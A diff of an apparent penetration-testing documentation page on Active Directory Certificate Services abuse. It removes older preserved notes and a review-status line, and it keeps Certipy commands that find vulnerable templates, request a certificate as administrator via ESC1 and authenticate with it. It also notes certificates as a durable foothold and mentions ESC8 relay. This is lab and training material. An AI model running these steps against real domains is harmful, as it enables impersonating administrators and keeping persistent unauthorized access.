@@ -6,11 +6,15 @@ keywords: ["adcs", "ad cs", "certipy", "esc1", "certificate templates", "pkinit"
 boost: 2
 ---
 
-import { PreservedNotes } from "/snippets/preserved-notes.jsx";
+{/* VAULT_TASK_FINDER_START */}
+
+import { TargetContextBar } from "/snippets/target-context-bar.jsx";
+
+<TargetContextBar />
+
+{/* VAULT_TASK_FINDER_END */}
 
 {/* Generated from Active Directory/Reference/AD Certificate Services (ADCS) Quick Reference.md. Edit the Markdown source, then run scripts/sync_site.py. */}
-
-**Review status:** Editorially reviewed on 1 November 2026; commands have not been executed in a lab for this review. Record installed tool versions before applying examples.
 
 ## Qualify the certificate finding before choosing a recipe
 
@@ -59,34 +63,6 @@ Keep the request outcome and authentication outcome in separate notebook fields.
 
 [Reference 1](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation)
 
-## Preserved earlier notes
-
-<PreservedNotes>
-
-The following material is retained from the previous notebook. Use the reviewed guidance above for the current decision path. Older examples may assume a particular lab configuration.
-
-## Evaluate the whole certificate path
-
-Map the enterprise CA, published templates, your effective enrollment rights, template requirements and the authentication service that will consume the certificate. AD CS findings are configuration-specific. A template label such as ESC1 is a lead, not a promise that impersonation will work on every patched domain.
-
-### Enumerate with a known identity
-
-```bash
-certipy find -u 'USERNAME@DOMAIN_FQDN' -p 'PASSWORD' -dc-ip DC_IP -stdout
-certipy find -u 'USERNAME@DOMAIN_FQDN' -p 'PASSWORD' -dc-ip DC_IP -vulnerable -stdout
-```
-
-Keep the full enumeration as well as the filtered view. Read which templates are enabled/published, who can enroll, relevant authentication purposes, subject-name controls, approval/signature requirements, and CA configuration. The DC address used for directory discovery and the CA host used for enrollment need not be the same server.
-
-### Inspect your certificate without assuming an identity
-
-```bash
-openssl pkcs12 -in lab-certificate.pfx -clcerts -nokeys -out lab-certificate.pem
-openssl x509 -in lab-certificate.pem -noout -subject -issuer -dates -text
-```
-
-The first command prompts for the PFX password when needed and exports the certificate, not its private key. Check subject/SAN values, issuer, validity, usage extensions and identity-related extensions. Possessing the certificate alone is insufficient if you do not have its matching private key.
-
 ### Establish a normal enrollment baseline
 
 ```bash
@@ -105,53 +81,6 @@ klist
 
 Inspect the actual tool output and resulting cache location. Certificate mapping, account state, KDC certificate/PKINIT support, time and trust can all affect authentication. Newer strong-mapping enforcement can invalidate assumptions from older lab examples.
 
-### Decide whether a misconfiguration is actionable
-
-| Finding | Additional evidence needed |
-| --- | --- |
-| A template allows supplied identity fields | Effective enrollment rights, authentication purpose, CA issuance requirements and identity mapping |
-| You can edit a template or CA object | Exact writable properties and the resulting enrollment/authentication consequence |
-| Web enrollment accepts NTLM | Reachability, relay protections, authentication source, endpoint configuration and issuance rights |
-| A certificate was issued | Matching private key, expected identity, validity and an accepting authentication service |
-
-The earlier examples remain for their original lab context. Before applying an impersonation recipe, establish these conditions and save the baseline request, template properties and resulting identity. Use the [certificate lab walkthrough](/password-attacks/pass-the-certificate) for its existing worked sequence, while keeping the current environment's mapping rules explicit.
-
-## Certipy: choose the operation and read the result
-
-Enumerate AD Certificate Services and authenticate with a lab certificate.
-
-### What the result establishes
-
-Read CA/template properties and effective enrollment rights, then evaluate the complete certificate-authentication path.
-
-### Prerequisites and common failures
-
-A vulnerability label is not a universal exploit guarantee; template policy, CA settings, mapping enforcement and certificate identity all matter.
-
-### Example 1: Find vulnerable templates
-
-Run in: **Kali**. Use the DC address for LDAP enumeration, not the CA address.
-
-```bash
-certipy find -u 'USER@DOMAIN_FQDN' -p 'PASSWORD' -dc-ip DC_IP -vulnerable -stdout
-```
-
-### Example 2: Authenticate with a certificate
-
-Run in: **Kali**. DNS, DC time, and certificate identity must match the lab.
-
-```bash
-certipy auth -pfx CERTIFICATE.pfx -dc-ip DC_IP
-```
-
-**LDAP timeout** — Check DC_IP, routing, and LDAP reachability. The CA and DC may be different hosts.
-
-**Kerberos clock skew** — Compare your time with the DC, including date and timezone; internet time may differ from lab time.
-
-## Existing notes and worked examples
-
-Supplementary quick reference from the existing vault site. It does not mark the module as complete.
-
 Misconfigured certificate templates (ESC1–ESC8) let low-priv users obtain certs that authenticate as anyone. Enumerate with Certipy.
 
 ```bash
@@ -168,7 +97,4 @@ certipy req -u USER@$DOMAIN -p PASS -ca CA-NAME -template VulnTemplate -upn admi
 certipy auth -pfx administrator.pfx -dc-ip $DC
 ```
 
-
 > ESC8 = NTLM relay to the CA's web enrollment (`certipy relay`). Certificates survive password resets, making them a durable foothold.
-
-</PreservedNotes>
